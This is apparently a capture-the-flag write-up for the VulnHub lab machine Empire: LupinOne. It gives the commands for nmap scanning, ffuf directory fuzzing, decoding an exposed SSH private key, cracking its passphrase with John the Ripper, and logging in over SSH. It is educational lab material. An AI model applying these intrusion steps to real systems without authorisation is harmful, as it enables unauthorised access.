# Empire: LupinOne

- **Machine:** Empire: LupinOne
- **Download:** https://www.vulnhub.com/entry/empire-lupinone,750/

![](images/779-1.png)

---

## Setup

- Extract the downloaded archive.
- Import the `.ovf` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](images/779-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.227
```

![](images/779-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.227
```

```bash
nmap -sC -sV -A 192.168.2.227
```

---

## HTTP Enumeration

This command performs an aggressive scan and runs the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.227
```

![](images/779-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.227/
- http://192.168.2.227/robots.txt
- http://192.168.2.227/image/
- http://192.168.2.227/~myfiles/

---

## Enumerate User Directories

Use **FFUF** to discover hidden user directories.

```bash
ffuf -u http://192.168.2.227/~FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -ic -fc 403
```

![](images/779-5.png)

A hidden user directory is discovered.

Visit:

```text
http://192.168.2.227/~secret/
```

![](images/779-6.png)

The page suggests that **icex64** is a valid username.

---

## Enumerate Hidden Files

Search for hidden files inside the `/~secret` directory.

```bash
ffuf -u http://192.168.2.227/~secret/.FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -ic -fc 403 -e .txt,.php,.js,.html,.py
```

![](images/779-7.png)

---

## Retrieve the Hidden File

Visit:

```text
http://192.168.2.227/~secret/.mysecret.txt
```

![](images/779-8.png)

The file contains a Base58-encoded value.

---

## Decode the SSH Private Key

Decode the Base58-encoded data.

- https://emn178.github.io/online-tools/base58/decode/

![](images/779-9.png)

Save the decoded content as an SSH private key.

```bash
nano id_rsa
```

---

## Set File Permissions

```bash
chmod 600 id_rsa
```

![](images/779-10.png)

---

## Crack the SSH Key Passphrase

Convert the SSH private key into a format supported by John the Ripper.

```bash
ssh2john id_rsa > hash.txt
```

Crack the passphrase.

```bash
john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt
```

![](images/779-11.png)

The SSH key passphrase is successfully recovered.

---

# SSH Access

### Credentials

```text
Username : icex64
Password : P@55w0rd!
```

Connect using the recovered private key.

```bash
ssh -i id_rsa icex64@192.168.2.227
```

![](images/779-12.png)

Successful authentication provides shell access.

---

# Impact

- Hidden user directories disclosed sensitive information.
- A Base58-encoded SSH private key was publicly accessible.
- The private key passphrase was weak and successfully cracked.
- Valid SSH credentials provided unauthorized system access.

---

# Key Learning

- Enumerate hidden user directories using FFUF.
- Sensitive files should never be stored in publicly accessible web directories.
- Base58 is an encoding format, not encryption.
- SSH private keys should always be protected with strong passphrases.
- Proper file permissions and access controls are essential for protecting authentication material.

---

# Important Concepts

| Concept | Description |
|---------|-------------|
| **Base58** | Encoding format commonly used to represent binary data. |
| **SSH Private Key** | Authentication key used for SSH login. |
| **ssh2john** | Converts an SSH private key into a John the Ripper hash. |
| **John the Ripper** | Password and passphrase cracking tool. |
| **chmod 600** | Restricts access so only the file owner can read and write the key. |

---

# Summary

The assessment began with web enumeration, which identified hidden user directories and exposed a Base58-encoded SSH private key. After decoding the key, it was converted into a crackable format using `ssh2john`, and the passphrase was recovered with John the Ripper. Using the recovered private key and passphrase, SSH authentication was successfully performed, providing initial access to the target system.